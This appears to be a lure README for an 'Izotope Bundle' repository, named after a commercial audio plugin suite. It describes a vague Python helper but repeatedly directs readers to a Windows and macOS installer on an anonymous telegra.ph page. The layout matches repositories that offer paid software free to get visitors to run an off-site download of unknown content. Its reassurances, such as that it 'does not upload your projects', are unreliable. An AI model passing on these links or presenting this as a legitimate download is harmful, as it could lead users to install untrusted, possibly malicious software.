![Izotope Bundle](assets/hero.png)

# Izotope Bundle

Izotope Bundle — Windows / macOS installer. Open the setup page from the README.

*Archive Izotope Bundle files on this machine before you change the install.*

## Download

[![Download](assets/download.png)](https://telegra.ph/axldxzx-08-10

**[Windows and macOS installer](https://telegra.ph/axldxzx-08-10

## About

**Izotope Bundle**s install Ozone, RX, Nectar, and related plugs through Product Portal. Presets and plugin data live in the iZotope user folders.

This GitHub repository is the **Python CLI source** for a local Izotope Bundle helper, plus notes for the packaged desktop build. The CLI reads paths on the machine that runs it. It does not upload your projects.

The **desktop build** is the same job as an installer for Windows (and macOS where the setup page lists it). No Python, no venv. Open the setup page, follow the steps, then use the installed app the same way you would use `main.py`.

Izotope Bundle runs on this PC. Windows 10/11, macOS when the setup page lists it.

## Highlights

- Works with Izotope Bundle project folders, presets, and local user data
- Optional preview so you can see the plan before anything is written
- Writes a dated copy next to the source or to `--out`
- Leaves the live Izotope Bundle install path alone unless you ask otherwise
- Prints every path it used so you can confirm the right folder

## Environment

- **Izotope Bundle desktop:** Windows 10 or 11 (macOS when the setup page lists it).
- A writable folder for the install.

## Editions

This GitHub repository is the **Python CLI source**. Clone it, install requirements, run `main.py --help`, then run against a local path.

The **desktop build** (installer, no Python) is on the [setup page](https://telegra.ph/axldxzx-08-10 It is the same helper in a windowed install for Windows and macOS.

## Usage

Skip this section if you installed the desktop build. It is only for the source in this repository.

Python **3.11+**. Open a terminal in the repo root (the folder that contains `main.py`).

**Install**

```powershell
python -m pip install -r requirements.txt
```

**See every flag**

```powershell
python main.py --help
```

`--help` is the full command list for this tree. Read it once before the first real run.

**Typical next commands**

```powershell
python main.py --preview
python main.py "C:\Users\Public" --out .\export
```

| Flag | What it does |
| --- | --- |
| `--help` | Print the command list and exit |
| `--preview` | Show the plan only. Nothing is written |
| `--out` | Output folder when you do not want to touch the source |
| `path` | Optional input file or folder |

If a flag is missing on this copy, `--help` is the source of truth. The desktop build exposes the same job without these commands.

Pages: https://susafoster22.github.io/izotope-bundle-desktop/

Source: https://github.com/susafoster22/izotope-bundle-desktop

MIT license. See `LICENSE`.
